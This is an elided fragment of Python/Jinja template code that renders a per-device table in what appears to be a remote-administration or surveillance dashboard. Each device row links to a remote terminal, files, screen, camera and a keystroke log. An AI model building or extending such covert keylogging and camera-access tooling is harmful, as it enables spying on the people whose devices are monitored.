...
def render_device_tables():
    ...
    <section class="panel">
      ...
      <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
        ...
        <td data-label="Actions" class="actions"><button class="mini" onclick="toggleTest('{{ mac }}')">Channel</button><button class="mini {{ 'test' if info.get('wifi_shutdown_exempt') == '1' else '' }}" onclick="toggleWifiExempt('{{ mac }}', {{ 'false' if info.get('wifi_shutdown_exempt') == '1' else 'true' }})">WiFi exempt {{ 'on' if info.get('wifi_shutdown_exempt') == '1' else 'off' }}</button><a class="mini link" href="/terminal/{{ mac }}">Terminal</a><a class="mini link" href="/files/{{ mac }}">Files</a><a class="mini link" href="/taskmgr/{{ mac }}">Tasks</a><a class="mini link" href="/memory/{{ mac }}">Memory</a><a class="mini link" href="/screen/{{ mac }}">Screen</a><a class="mini link" href="/camera/{{ mac }}">Camera</a><a class="mini link" href="/view_log/{{ mac }}">Logs</a><a class="mini link" href="/keylog/{{ mac }}">Key log</a><a class="mini link" href="/entertainment/{{ mac }}">Media</a></td>
